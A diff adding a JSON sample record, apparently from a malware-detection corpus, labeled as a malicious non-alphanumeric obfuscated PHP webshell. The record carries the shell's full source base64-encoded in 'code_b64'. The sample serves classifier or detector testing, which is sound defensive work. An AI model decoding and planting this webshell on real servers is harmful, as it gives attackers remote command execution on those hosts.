@@ -1,0 +1,10 @@
+{
+  "id": "nonalpha",
+  "label": "malicious",
+  "title": "Non-alphanumeric obfuscated shell",
+  "family": "php-webshell",
+  "source": "public corpus: Non-alphanumeric.php (flagged by signature tools)",
+  "code_b64": "PD9waHAKCiRfW109QCErXzsgJF9fPUAke199Pj4kXzskX1tdPSRfXzskX1tdPUBfO0AkX1soKCsrJF9fKSsoJF9fKysgKSldLj0kXzsKJF9bXT0rKyRfXzsgJF9bXT0kX1stLSRfX11bJF9fPj4kX19dOyRfWyRfX10uPSgoJF9fKyRfXykrICRfWyRfXy0kX19dKS4oJF9fKyRfXyskX18pKyRfWyRfXy0kX19dOwokX1skX18rJF9fXSA9KCRfWyRfX11bJF9fPj4kX19dKS4oJF9bJF9fXVskX19dXiRfWyRfX11bKCRfXzw8JF9fKS0kX19dICk7CiRfWyRfXyskX19dIC49KCRfWyRfX11bKCRfXzw8JF9fKS0oJF9fLyRfXyldKV4oJF9bJF9fXVskX19dICk7CiRfWyRfXyskX19dIC49KCRfWyRfX11bJF9fKyRfX10pXiRfWyRfX11bKCRfXzw8JF9fKS0kX18gXTsKJF89JCAKJF9bJF9fKyAkX19dIDskX1tALV9dKCRfW0AhK19dICk7CiAKPz4g",
+  "trace_id": "demo_operator_tool",
+  "marker": null
+}
